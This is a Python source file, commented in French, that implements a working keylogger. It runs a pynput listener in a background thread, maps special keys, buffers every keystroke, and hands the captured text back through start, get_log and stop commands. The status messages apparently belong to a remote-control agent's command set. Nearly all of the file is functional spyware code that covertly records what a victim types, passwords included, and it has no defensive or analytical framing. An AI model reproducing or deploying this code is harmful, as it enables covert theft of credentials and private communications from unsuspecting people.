"""Module keylogger pour enregistrer les frappes clavier."""

import logging
import threading
import time
from typing import Optional

logger = logging.getLogger(__name__)

# Try to import platform-specific keylogging
try:
    from pynput import keyboard as pynput_keyboard

    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False
    logger.warning("pynput non installé. Keylogger limité.")

    # Fallback simple pour Linux (lecture /dev/input)
    try:
        import evdev

        HAS_EVDEV = True
    except ImportError:
        HAS_EVDEV = False


class Keylogger:
    """Keylogger pour enregistrer les frappes clavier.

    Fonctionne en arrière-plan et stocke les touches dans un buffer.
    """

    def __init__(self):
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._buffer: list = []
        self._lock = threading.Lock()
        self._listener = None

    def start(self) -> str:
        """Démarre l'enregistrement des frappes."""
        if self._running:
            return "[!] Keylogger déjà actif"

        if not HAS_PYNPUT:
            return "[!] pynput requis : pip install pynput"

        try:
            self._running = True
            self._buffer = []
            self._thread = threading.Thread(target=self._run, daemon=True)
            self._thread.start()
            logger.info("Keylogger démarré")
            return "[+] Keylogger démarré avec succès"
        except Exception as e:
            self._running = False
            logger.error(f"Erreur démarrage keylogger : {e}")
            return f"[!] Erreur : {e}"

    def _run(self):
        """Boucle interne d'écoute du clavier."""
        try:

            def on_press(key):
                if not self._running:
                    return False
                try:
                    # Touche caractère
                    if hasattr(key, "char") and key.char is not None:
                        self._add_to_buffer(key.char)
                    else:
                        # Touche spéciale
                        key_name = str(key).replace("Key.", "")
                        special_keys = {
                            "enter": "\n",
                            "space": " ",
                            "tab": "\t",
                            "backspace": "[BACKSPACE]",
                            "shift": "",
                            "ctrl": "",
                            "alt": "",
                            "esc": "[ESC]",
                            "caps_lock": "[CAPS]",
                        }
                        mapped = special_keys.get(key_name.lower())
                        if mapped:
                            self._add_to_buffer(mapped)
                        elif key_name:
                            self._add_to_buffer(f"[{key_name.upper()}]")
                except Exception:
                    pass

            self._listener = pynput_keyboard.Listener(on_press=on_press)
            self._listener.start()
            self._listener.join()

        except Exception as e:
            logger.error(f"Erreur listener keylogger : {e}")
            self._running = False

    def _add_to_buffer(self, char: str):
        """Ajoute une touche au buffer de manière thread-safe."""
        with self._lock:
            self._buffer.append(char)

    def get_log(self) -> str:
        """Récupère et vide le buffer des frappes enregistrées."""
        if not self._running and not self._buffer:
            return "[!] Keylogger non actif. Utilisez keylogger_start d'abord."

        with self._lock:
            log = "".join(self._buffer)
            self._buffer = []
            return log if log else "(aucune frappe enregistrée)"

    def stop(self) -> str:
        """Arrête le keylogger."""
        if not self._running:
            return "[!] Keylogger déjà arrêté"

        self._running = False
        if self._listener:
            self._listener.stop()

        remaining = ""
        with self._lock:
            if self._buffer:
                remaining = "".join(self._buffer)
                self._buffer = []

        logger.info("Keylogger arrêté")
        msg = "[+] Keylogger arrêté"
        if remaining:
            msg += f"\n[+] Frappes restantes : {remaining}"
        return msg